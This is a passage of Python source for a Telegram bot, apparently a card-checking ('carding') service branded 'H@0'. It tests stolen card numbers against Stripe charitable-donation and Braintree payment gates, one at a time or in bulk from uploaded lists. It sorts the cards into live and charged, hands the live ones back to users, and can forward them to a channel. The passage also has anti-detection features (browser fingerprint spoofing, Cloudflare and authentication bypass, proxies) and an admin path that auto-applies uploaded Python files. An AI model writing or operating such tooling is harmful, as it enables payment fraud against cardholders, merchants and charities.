        gt_label = "Braintree" if gt == "braintree" else "Stripe Charitable"

        if active_cfg.get("enabled", False):
            await message.reply(
                "<b>ℹ️  GATE ALREADY ON</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{gt_label} gate is already active.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        enable_config(active_cid)
        logger.info(f"{gt_label} gate ENABLED by admin {message.from_user.id}")
        await message.reply(
            "<b>🟢  GATE ON</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{gt_label} gate enabled.\n"
            "Cards will be checked.\n\n"
            "<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['gateoff'])
    async def cmd_gateoff(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        active_cid = get_active_config_id()
        active_cfg = get_config(active_cid) or {}
        gt = active_cfg.get("gate_type", "stripe")
        gt_label = "Braintree" if gt == "braintree" else "Stripe Charitable"

        if not active_cfg.get("enabled", False):
            await message.reply(
                "<b>ℹ️  GATE ALREADY OFF</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{gt_label} gate is already disabled.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        disable_config(active_cid)
        logger.info(f"{gt_label} gate DISABLED by admin {message.from_user.id}")
        await message.reply(
            "<b>🔴  GATE OFF</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{gt_label} gate disabled.\n"
            "No cards will be checked.\n"
            "Use /gateon to re-enable.\n\n"
            "<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['hybrid'])
    async def cmd_hybrid(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Admin only.", parse_mode='HTML')
            return

        args = message.get_args()
        parts = args.strip().lower().split() if args else []

        gate_target = None
        toggle_val = None

        for p in parts:
            if p in ('stripe', 'st'):
                gate_target = 'stripe'
            elif p in ('braintree', 'bt'):
                gate_target = 'braintree'
            elif p in ('on', 'true'):
                toggle_val = True
            elif p in ('off', 'false'):
                toggle_val = False

        if not gate_target:
            active_cfg = get_config(get_active_config_id())
            gate_target = active_cfg.get('gate_type', 'stripe') if active_cfg else 'stripe'

        current = get_gate_setting(gate_target, "hybrid_mode", False)
        gate_label = "Stripe" if gate_target == "stripe" else "Braintree"

        if toggle_val is not None:
            set_gate_setting(gate_target, "hybrid_mode", toggle_val)
            icon = "🟢" if toggle_val else "🔴"
            if gate_target == "stripe":
                detail = ("✅ Browser fingerprints active\n✅ Cookie persistence ON\n✅ Silence Auth bypass ON\n" if toggle_val else "Standard requests-only mode.\n")
            else:
                detail = ("✅ Cloudflare bypass via real browser\n✅ Cookie persistence ON\n✅ CSRF + BT token extraction\n" if toggle_val else "Standard curl_cffi/cloudscraper mode.\n")
            await message.reply(
                f"<b>{icon}  {gate_label.upper()} HYBRID MODE {'ON' if toggle_val else 'OFF'}</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Playwright browser: <b>{'ENABLED' if toggle_val else 'DISABLED'}</b>\n"
                f"{detail}\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            logger.info(f"Hybrid mode {gate_label} {'ON' if toggle_val else 'OFF'} by admin {message.from_user.id}")
        else:
            stripe_h = get_gate_setting("stripe", "hybrid_mode", False)
            bt_h = get_gate_setting("braintree", "hybrid_mode", False)
            s_icon = "🟢" if stripe_h else "🔴"
            b_icon = "🟢" if bt_h else "🔴"
            await message.reply(
                f"<b>🔀  HYBRID MODE STATUS</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{s_icon} Stripe Hybrid: <b>{'ON' if stripe_h else 'OFF'}</b>\n"
                f"{b_icon} Braintree Hybrid: <b>{'ON' if bt_h else 'OFF'}</b>\n\n"
                "Hybrid uses Playwright browser for:\n"
                "• Real Canvas/WebGL/Hardware fingerprints\n"
                "• Cloudflare bypass (Braintree)\n"
                "• Cookie persistence + CSRF extraction\n"
                "• Falls back to standard if browser fails\n\n"
                "<b>TOGGLE</b>\n"
                "<code>/hybrid on</code>  ·  Enable (active gate)\n"
                "<code>/hybrid off</code>  ·  Disable (active gate)\n"
                "<code>/hybrid stripe on</code>\n"
                "<code>/hybrid bt on</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )

    @dp.message_handler(commands=['chk'])
    async def cmd_chk(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        args = message.get_args()
        if not args:
            active_gt = get_config_gate_type(get_active_config_id())
            gate_label = "Braintree" if active_gt == "braintree" else "Stripe Charitable"
            await message.reply(
                "<b>🔍  GATE CHECKER</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "\n<b>USAGE</b>\n"
                "<code>/chk 4111111111111111|12|25|123</code>\n\n"
                f"Tests a card against the\n"
                f"current <b>{gate_label}</b> gate.\n"
                "Use to verify gate is working.\n\n"
                "\n<b>FORMAT</b>\n"
                "<code>CC|MM|YY|CVV</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        card_str = args.strip().replace(' ', '')
        parts = card_str.split('|')
        if len(parts) < 4:
            await message.reply(
                "❌ Invalid format. Use: <code>CC|MM|YY|CVV</code>",
                parse_mode='HTML'
            )
            return

        chk_uid = str(message.from_user.id)
        if not is_admin(message.from_user.id, message.from_user.username):
            allowed, remaining = check_user_card_limit(chk_uid)
            if not allowed:
                limit = get_user_limit("max_cards_per_user")
                await message.reply(
                    f"<b>⚠️  DAILY LIMIT REACHED</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"You've used all <code>{limit}</code> checks today.\n"
                    f"Limit resets daily.\n\n"
                    f"<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
                return

        is_valid, reason = full_card_check(card_str)
        if not is_valid:
            await message.reply(
                f"<b>❌  CARD INVALID</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{reason}\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        if not is_admin(message.from_user.id, message.from_user.username):
            increment_user_check_count(chk_uid)

        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        brand = get_card_brand(cc[:6])

        active_gt = get_config_gate_type(get_active_config_id())
        gate_display = "Braintree" if active_gt == "braintree" else "Stripe Charitable"

        await message.reply(
            f"<b>⏳  CHECKING CARD...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💳  <code>{cc[:6]}****{cc[-4:]}</code>\n"
            f"📋  {brand}  ·  Luhn ✅\n"
            f"🛡  Gate: {gate_display}\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

        try:
            check_time = None
            if crawler_instance:
                is_live, tag, detail, gate_name, proxy_used, check_time = await crawler_instance.check_card(card_str, gate_type=active_gt)
            else:
                t0 = time.time()
                if active_gt == "braintree":
                    loop = asyncio.get_event_loop()
                    result = await loop.run_in_executor(None, check_braintree, cc, mm, yy, cvv)
                else:
                    from stripe import check_stripe as _chk
                    loop = asyncio.get_event_loop()
                    result = await loop.run_in_executor(None, _chk, cc, mm, yy, cvv)
                check_time = time.time() - t0
                status = result.get('status', 'declined')
                detail = result.get('detail', 'Unknown')
                gate_name = result.get('gate', gate_display)
                is_live = status in ('live', 'charged')
                tag = "CHARGED" if status == 'charged' else ("LIVE" if is_live else "DEAD")
                proxy_used = None

            proxy_display = proxy_used if proxy_used else "DIRECT"
            bin_info = await safe_bin_info(crawler_instance, cc[:6])

            if is_live:
                msg = fmt_chk_live(card_str, cc, bin_info, gate_name, detail, proxy_display, tag, check_time)
                await message.reply(msg, parse_mode='HTML')
                track_user_card(chk_uid, card_str, "live")
            else:
                msg = fmt_chk_dead(card_str, cc, bin_info, gate_name, detail, proxy_display, check_time)
                await message.reply(msg, parse_mode='HTML')
                track_user_card(chk_uid, f"{card_str} | {detail}", "error")

        except Exception as e:
            logger.error(f"Check command error: {e}")
            track_user_card(chk_uid, f"{card_str} | {str(e)[:60]}", "error")
            await message.reply(
                f"<b>⚠️  CHECK ERROR</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<code>{str(e)[:60]}</code>\n\n"
                f"Try /autofix to diagnose.\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )

    _mass_check_running = {}
    _mass_check_cancel = {}

    @dp.message_handler(commands=['mycards'])
    async def cmd_mycards(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        uid = str(message.from_user.id)
        fpath = get_user_card_file(uid, "lives")
        if not fpath:
            await message.reply(
                "<b>💳  MY LIVE CARDS</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "No live cards yet.\n"
                "Use <code>/chk</code> or mass check\n"
                "to start checking.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        cards = get_user_cards(uid, "lives")
        count = len(cards)
        daily_used = get_user_check_count(uid)
        limit = get_user_limit("max_cards_per_user")
        limit_str = f"{daily_used}/{limit}" if limit > 0 else f"{daily_used}/∞"

        try:
            await message.reply_document(
                InputFile(fpath, filename=f"my_lives_{count}cards.txt"),
                caption=(
                    f"<b>💳  MY LIVE CARDS</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"✅  <code>{count}</code> live cards\n"
                    f"📊  Today: <code>{limit_str}</code> checks\n\n"
                    f"<code>━━ H@0 ━━</code>"
                ),
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"mycards error: {e}")
            await message.reply("Error sending file. Try again.")

    @dp.message_handler(commands=['myerrors'])
    async def cmd_myerrors(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        uid = str(message.from_user.id)
        fpath = get_user_card_file(uid, "errors")
        if not fpath:
            await message.reply(
                "<b>⚠️  MY ERROR CARDS</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "No error cards recorded.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        cards = get_user_cards(uid, "errors")
        count = len(cards)
        try:
            await message.reply_document(
                InputFile(fpath, filename=f"my_errors_{count}cards.txt"),
                caption=(
                    f"<b>⚠️  MY ERROR CARDS</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"⚠️  <code>{count}</code> error cards\n\n"
                    f"<code>━━ H@0 ━━</code>"
                ),
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"myerrors error: {e}")
            await message.reply("Error sending file. Try again.")

    @dp.message_handler(commands=['setlimit'])
    async def cmd_setlimit(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Admin only.", parse_mode='HTML')
            return

        args = message.get_args()
        if not args:
            limits = get_all_user_limits()
            card_lim = limits['max_cards_per_user']
            conc_lim = limits['max_concurrent_users']
            card_str = f"<code>{card_lim}</code>/day" if card_lim > 0 else "♾ Unlimited"
            await message.reply(
                "<b>⚙️  USER LIMITS</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"💳 Cards/user/day: {card_str}\n"
                f"👥 Max concurrent: <code>{conc_lim}</code>\n\n"
                "<b>SET LIMITS</b>\n"
                "<code>/setlimit cards [num]</code>\n"
                "  Max cards per user per day\n"
                "  (0 = unlimited)\n\n"
                "<code>/setlimit users [num]</code>\n"
                "  Max concurrent mass checkers\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        parts = args.strip().lower().split()
        if len(parts) < 2 or not parts[1].isdigit():
            await message.reply(
                "Usage:\n"
                "<code>/setlimit cards 50</code>\n"
                "<code>/setlimit users 10</code>",
                parse_mode='HTML'
            )
            return

        key = parts[0]
        val = int(parts[1])
        if key in ("cards", "card"):
            set_user_limit("max_cards_per_user", val)
            label = f"<code>{val}</code>/day" if val > 0 else "♾ Unlimited"
            await message.reply(
                f"<b>✅  LIMIT UPDATED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"💳 Cards per user: {label}\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        elif key in ("users", "user", "concurrent"):
            set_user_limit("max_concurrent_users", val)
            await message.reply(
                f"<b>✅  LIMIT UPDATED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"👥 Max concurrent: <code>{val}</code>\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        else:
            await message.reply(
                "Usage:\n"
                "<code>/setlimit cards 50</code>\n"
                "<code>/setlimit users 10</code>",
                parse_mode='HTML'
            )

    _SCRIPT_FILES = {
        "stripe": "stripe.py",
        "braintree": "braintree_gate.py",
        "bt": "braintree_gate.py",
        "config": "config.py",
        "proxy": "proxy_scraper.py",
        "human": "human_behavior.py",
        "smartgen": "smart_gen.py",
        "hybrid": "hybrid_stripe.py",
        "hybridbt": "hybrid_braintree.py",
        "main": "main.py",
    }

    _UPLOADABLE_SCRIPTS = {
        "stripe.py": "stripe",
        "braintree_gate.py": "braintree",
        "config.py": "config",
        "proxy_scraper.py": "proxy",
        "human_behavior.py": "human",
        "smart_gen.py": "smartgen",
        "hybrid_stripe.py": "hybrid",
        "hybrid_braintree.py": "hybridbt",
    }

    @dp.message_handler(commands=['exportgate', 'downloadgate', 'getscript'])
    async def cmd_exportgate(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Admin only.", parse_mode='HTML')
            return

        args = message.get_args()
        if not args or args.strip().lower() not in _SCRIPT_FILES:
            script_list = ""
            for key, fname in _SCRIPT_FILES.items():
                fpath = os.path.join(BASE_DIR, fname)
                size = os.path.getsize(fpath) if os.path.exists(fpath) else 0
                size_kb = f"{size / 1024:.1f}KB"
                script_list += f"  <code>{key}</code> → {fname} ({size_kb})\n"

            await message.reply(
                "<b>📜  EXPORT GATE SCRIPT</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "<b>USAGE</b>\n"
                "<code>/exportgate [name]</code>\n\n"
                "<b>AVAILABLE SCRIPTS</b>\n"
                f"{script_list}\n"
                "<b>EXAMPLES</b>\n"
                "<code>/exportgate stripe</code>\n"
                "<code>/exportgate braintree</code>\n"
                "<code>/exportgate config</code>\n\n"
                "📤 Download script, modify, send back\n"
                "Bot auto-applies uploaded <code>.py</code> files\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        key = args.strip().lower()
        fname = _SCRIPT_FILES[key]
        fpath = os.path.join(BASE_DIR, fname)

        if not os.path.exists(fpath):
            await message.reply(f"❌ Script <code>{fname}</code> not found.", parse_mode='HTML')
            return

        try:
            size = os.path.getsize(fpath)
            size_kb = f"{size / 1024:.1f}KB"
            with open(fpath, 'r') as f:
                line_count = sum(1 for _ in f)

            await message.reply_document(
                InputFile(fpath, filename=f"H0_{fname}"),
                caption=(
                    f"<b>📜  GATE SCRIPT EXPORTED</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📄 File: <code>{fname}</code>\n"
                    f"📏 Size: <code>{size_kb}</code>\n"
                    f"📝 Lines: <code>{line_count}</code>\n\n"
                    f"✏️ Edit this file and send it back\n"
                    f"Bot will auto-apply the updated script\n\n"
                    f"<code>━━ H@0 ━━</code>"
                ),
                parse_mode='HTML'
            )
            logger.info(f"Script {fname} exported by {message.from_user.id}")
        except Exception as e:
            logger.error(f"Export gate script error: {e}")
            await message.reply(f"❌ Export failed: {str(e)[:60]}", parse_mode='HTML')

    @dp.message_handler(commands=['exportcfg'])
    async def cmd_exportcfg(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Admin only.", parse_mode='HTML')
            return

        args = message.get_args()
        if args and args.strip().isdigit():
            cid = int(args.strip())
        else:
            cid = get_active_config_id()

        data = export_config_data(cid)
        if not data:
            await message.reply(f"❌ Config #{cid} not found.", parse_mode='HTML')
            return

        cfg = get_config(cid)
        cfg_name = cfg["name"] if cfg else f"Config_{cid}"
        safe_name = "".join(c if c.isalnum() or c in ('_', '-') else '_' for c in cfg_name)
        filename = f"H0_{safe_name}.json"
        filepath = os.path.join(BASE_DIR, filename)

        try:
            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)

            gt = data.get("gate_type", "stripe").upper()
            settings_preview = ""
            for k, v in data.get("settings", {}).items():
                settings_preview += f"  <code>{k}</code>: <code>{v}</code>\n"

            await message.reply_document(
                InputFile(filepath, filename=filename),
                caption=(
                    f"<b>📤  CONFIG EXPORTED</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📋 Config: <b>#{cid} — {cfg_name}</b>\n"
                    f"⚙️ Gate: <code>{gt}</code>\n"
                    f"{'🟢' if data.get('enabled') else '🔴'} {'Enabled' if data.get('enabled') else 'Disabled'}\n\n"
                    f"<b>Settings:</b>\n{settings_preview}\n"
                    f"Send this file back to import it.\n"
                    f"Or reply with: <code>/importcfg [config_id]</code>\n\n"
                    f"<code>━━ H@0 ━━</code>"
                ),
                parse_mode='HTML'
            )
            logger.info(f"Config #{cid} exported by {message.from_user.id}")
        except Exception as e:
            logger.error(f"Export config error: {e}")
            await message.reply(f"❌ Export failed: {str(e)[:60]}", parse_mode='HTML')
        finally:
            if os.path.exists(filepath):
                os.remove(filepath)

    @dp.message_handler(commands=['importcfg'])
    async def cmd_importcfg(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Admin only.", parse_mode='HTML')
            return

        reply_msg = message.reply_to_message
        if not reply_msg or not reply_msg.document:
            await message.reply(
                "<b>📥  IMPORT CONFIG</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "<b>USAGE</b>\n"
                "Reply to a <code>.json</code> config file with:\n"
                "<code>/importcfg</code> — Creates new config\n"
                "<code>/importcfg 1</code> — Overwrites Config #1\n\n"
                "<b>Or just send the .json file directly</b>\n"
                "Bot will auto-create a new config.\n\n"
                "<b>EXPORT</b>\n"
                "<code>/exportcfg</code> — Export active config\n"
                "<code>/exportcfg 2</code> — Export Config #2\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        doc = reply_msg.document
        if not doc.file_name or not doc.file_name.endswith('.json'):
            await message.reply("❌ Only <code>.json</code> config files supported.", parse_mode='HTML')
            return

        args = message.get_args()
        target_id = None
        if args and args.strip().isdigit():
            target_id = int(args.strip())

        try:
            file_info = await message.bot.get_file(doc.file_id)
            file_data = await message.bot.download_file(file_info.file_path)
            text_content = file_data.read().decode('utf-8', errors='ignore')
            data = json.loads(text_content)

            ok, result_msg = import_config_data(data, target_config_id=target_id)

            if ok:
                gt = data.get("gate_type", "stripe").upper()
                name = data.get("name", "Unknown")
                settings_preview = ""
                for k, v in data.get("settings", {}).items():
                    settings_preview += f"  <code>{k}</code>: <code>{v}</code>\n"

                await message.reply(
                    f"<b>✅  CONFIG IMPORTED</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📋 {result_msg}\n"
                    f"⚙️ Gate: <code>{gt}</code>\n"
                    f"📛 Name: <b>{name}</b>\n\n"
                    f"<b>Settings Applied:</b>\n{settings_preview}\n"
                    f"<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
                logger.info(f"Config imported by {message.from_user.id}: {result_msg}")
            else:
                await message.reply(f"❌ Import failed: {result_msg}", parse_mode='HTML')
        except json.JSONDecodeError:
            await message.reply("❌ Invalid JSON file.", parse_mode='HTML')
        except Exception as e:
            logger.error(f"Import config error: {e}")
            await message.reply(f"❌ Import error: {str(e)[:60]}", parse_mode='HTML')

    @dp.message_handler(commands=['masscheck'])
    async def cmd_masscheck(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        args = message.get_args()
        if not args:
            ch_status = "🟢 ON" if get_notify("live") else "🔴 OFF"
            await message.reply(
                "<b>📦  MASS CHECK</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "<b>USAGE</b>\n"
                "<code>/masscheck [gate] [limit]</code>\n\n"
                "<b>GATES</b>\n"
                "  <code>stripe</code> — Stripe only\n"
                "  <code>bt</code> — Braintree only\n"
                "  <code>both</code> — Both gates (default)\n\n"
                "<b>LIMIT</b>\n"
                "  Max cards to check (default: all)\n\n"
                "<b>EXAMPLES</b>\n"
                "<code>/masscheck stripe 50</code>\n"
                "<code>/masscheck bt 100</code>\n"
                "<code>/masscheck both</code>\n\n"
                "<b>FILE UPLOAD</b>\n"
                "Send a <code>.txt</code> file with cards\n"
                "(<code>CC|MM|YY|CVV</code> per line),\n"
                "then reply to it with:\n"
                "<code>/masscheck stripe 50</code>\n\n"
                f"📡 Channel Send: {ch_status}\n"
                "Toggle: <code>/masscheck channel on/off</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="📡 Channel ON", callback_data="mc_ch_on"),
                     InlineKeyboardButton(text="📡 Channel OFF", callback_data="mc_ch_off")],
                    [InlineKeyboardButton(text="🎛 Panel", callback_data="panel")]
                ])
            )
            return

        parts_args = args.strip().lower().split()

        if parts_args[0] == "channel":
            if len(parts_args) >= 2 and parts_args[1] in ("on", "off"):
                enabled = parts_args[1] == "on"
                set_notify("live", enabled)
                icon = "🟢 ON" if enabled else "🔴 OFF"
                await message.reply(
                    f"<b>📡  CHANNEL SEND: {icon}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"Live cards {'will' if enabled else 'will NOT'} be\n"
                    f"sent to channel.\n\n"
                    f"<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
                return
            else:
                await message.reply("Usage: <code>/masscheck channel on/off</code>", parse_mode='HTML')
                return

        if parts_args[0] == "stop":
            uid = str(message.from_user.id)
            if uid in _mass_check_running:
                _mass_check_cancel[uid] = True
                await message.reply(
                    "<b>⏹  STOPPING MASS CHECK...</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Current card will finish,\nthen mass check stops.\n\n"
                    "<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
            else:
                await message.reply("No mass check is running.", parse_mode='HTML')
            return

        uid = str(message.from_user.id)
        if uid in _mass_check_running:
            await message.reply(
                "⚠️ Mass check already running!\n"
                "Use <code>/masscheck stop</code> to cancel.",
                parse_mode='HTML'
            )
            return

        max_conc = get_user_limit("max_concurrent_users")
        if max_conc > 0 and len(_mass_check_running) >= max_conc:
            await message.reply(
                f"<b>⚠️  CONCURRENT LIMIT</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<code>{len(_mass_check_running)}/{max_conc}</code> mass checks running.\n"
                f"Wait for one to finish.\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        if not is_admin(message.from_user.id, message.from_user.username):
            allowed, remaining = check_user_card_limit(uid)
            if not allowed:
                limit = get_user_limit("max_cards_per_user")
                await message.reply(
                    f"<b>⚠️  DAILY LIMIT REACHED</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"You've used all <code>{limit}</code> checks today.\n\n"
                    f"<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
                return

        gate_choice = "both"
        card_limit = 0
        for p in parts_args:
            if p in ("stripe", "st"):
                gate_choice = "stripe"
            elif p in ("bt", "braintree"):
                gate_choice = "braintree"
            elif p in ("both", "all"):
                gate_choice = "both"
            elif p.isdigit():
                card_limit = int(p)

        cards_to_check = []
        reply_msg = message.reply_to_message
        if reply_msg and reply_msg.document:
            doc = reply_msg.document
            if doc.file_name and doc.file_name.endswith('.txt'):
                try:
                    file_info = await message.bot.get_file(doc.file_id)
                    file_data = await message.bot.download_file(file_info.file_path)
                    text_content = file_data.read().decode('utf-8', errors='ignore')
                    lines = [l.strip() for l in text_content.strip().split('\n') if l.strip()]
                    for line in lines:
                        line = line.replace(' ', '')
                        if '|' in line:
                            pts = line.split('|')
                            if len(pts) >= 4 and pts[0].isdigit() and len(pts[0]) >= 13:
                                cards_to_check.append(line)
                except Exception as e:
                    logger.error(f"Mass check file download error: {e}")
                    await message.reply(f"❌ Failed to read file: {str(e)[:60]}", parse_mode='HTML')
                    return
            else:
                await message.reply("❌ Only <code>.txt</code> files supported.", parse_mode='HTML')
                return

        if not cards_to_check:
            if crawler_instance and crawler_instance.cc_list:
                cards_to_check = list(crawler_instance.cc_list)
            else:
                cc_file = os.path.join(BASE_DIR, "livescc.txt")
                if os.path.exists(cc_file):
                    with open(cc_file, 'r') as f:
                        for line in f:
                            line = line.strip()
                            if line and '|' in line:
                                cards_to_check.append(line)

        if not cards_to_check:
            await message.reply(
                "❌ No cards to check!\n"
                "Upload a <code>.txt</code> file or load cards with <code>/loadcc</code>.",
                parse_mode='HTML'
            )
            return

        valid_cards = []
        for c in cards_to_check:
            ok, _ = full_card_check(c)
            if ok:
                valid_cards.append(c)

        if card_limit > 0:
            valid_cards = valid_cards[:card_limit]

        if not is_admin(message.from_user.id, message.from_user.username):
            user_lim = get_user_limit("max_cards_per_user")
            if user_lim > 0:
                used = get_user_check_count(uid)
                remaining = max(0, user_lim - used)
                if remaining == 0:
                    await message.reply(
                        f"<b>⚠️  DAILY LIMIT REACHED</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"You've used all <code>{user_lim}</code> checks today.\n\n"
                        f"<code>━━ H@0 ━━</code>",
                        parse_mode='HTML'
                    )
                    return
                if len(valid_cards) > remaining:
                    valid_cards = valid_cards[:remaining]

        if not valid_cards:
            await message.reply("❌ No valid cards found after validation.", parse_mode='HTML')
            return

        gate_labels = {"stripe": "Stripe", "braintree": "Braintree", "both": "Stripe + Braintree"}
        gate_label = gate_labels.get(gate_choice, "Both")
        ch_status = "🟢 ON" if get_notify("live") else "🔴 OFF"

        await message.reply(
            "<b>📦  MASS CHECK STARTED</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🛡 Gate: <b>{gate_label}</b>\n"
            f"💳 Cards: <code>{len(valid_cards)}</code>\n"
            f"📡 Channel: {ch_status}\n\n"
            f"Use <code>/masscheck stop</code> to cancel.\n\n"
            "<code>━━ H@0 ━━</code>",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⏹ Stop", callback_data="mc_stop")]
            ])
        )

        _mass_check_running[uid] = True
        _mass_check_cancel[uid] = False

        asyncio.create_task(_run_mass_check(
            message.bot, message.chat.id, uid,
            valid_cards, gate_choice, crawler_instance
        ))

    async def _run_mass_check(bot_inst, chat_id, uid, cards, gate_choice, crawler):
        PHOTO_PATH = os.path.join(BASE_DIR, "scrap.jpg")
        mc_stats = {'checked': 0, 'live': 0, 'dead': 0, 'errors': 0, 'charged': 0, 'auth': 0}
        approved_cards = []

        try:
            active_chat = get_active_chat_id()
            is_admin_user = is_admin(int(uid), None)

            for i, card_str in enumerate(cards):
                if _mass_check_cancel.get(uid):
                    break

                if not is_admin_user:
                    allowed, remaining = check_user_card_limit(uid)
                    if not allowed:
                        try:
                            await bot_inst.send_message(
                                chat_id,
                                f"<b>⚠️  DAILY LIMIT REACHED</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                f"Daily card limit reached at card {i+1}.\n"
                                f"Mass check stopped.\n\n"
                                f"<code>━━ H@0 ━━</code>",
                                parse_mode='HTML'
                            )
                        except Exception:
                            pass
                        break

                pts = card_str.strip().split('|')
                if len(pts) < 4:
                    continue
                cc, mm, yy, cvv = pts[0], pts[1], pts[2], pts[3]

                gates_to_run = []
                if gate_choice == "stripe":
                    gates_to_run = ["stripe"]
                elif gate_choice == "braintree":
                    gates_to_run = ["braintree"]
                else:
                    gates_to_run = ["stripe", "braintree"]

                card_is_live = False
                for gt in gates_to_run:
                    if _mass_check_cancel.get(uid):
                        break
                    try:
                        check_time = None
                        if crawler:
                            is_live, tag, detail, gate_name, proxy_used, check_time = await crawler.check_card(card_str, gate_type=gt)
                        else:
                            t0 = time.time()
                            if gt == "braintree":
                                loop = asyncio.get_event_loop()
                                result = await loop.run_in_executor(None, check_braintree, cc, mm, yy, cvv)
                            else:
                                from stripe import check_stripe as _chk
                                loop = asyncio.get_event_loop()
                                result = await loop.run_in_executor(None, _chk, cc, mm, yy, cvv)
                            check_time = time.time() - t0
                            status = result.get('status', 'declined')
                            detail = result.get('detail', 'Unknown')
                            gate_name = result.get('gate', gt.title())
                            is_live = status in ('live', 'charged')
                            tag = "CHARGED" if status == 'charged' else ("LIVE" if is_live else "DEAD")
                            proxy_used = None

                        proxy_display = proxy_used if proxy_used else "DIRECT"
                        gt_label = "Stripe" if gt == "stripe" else "Braintree"

                        if is_live:
                            card_is_live = True
                            mc_stats['live'] += 1
                            if tag == "CHARGED":
                                mc_stats['charged'] += 1
                            auth_type, _ = _classify_auth_type(tag, detail)
                            if "AUTH" in auth_type and tag != "CHARGED":
                                mc_stats.setdefault('auth', 0)
                                mc_stats['auth'] += 1
                            SESSION_STATS['total_live'] += 1
                            if tag == "CHARGED":
                                SESSION_STATS['charged'] += 1

                            bin_info = await safe_bin_info(crawler, cc[:6])
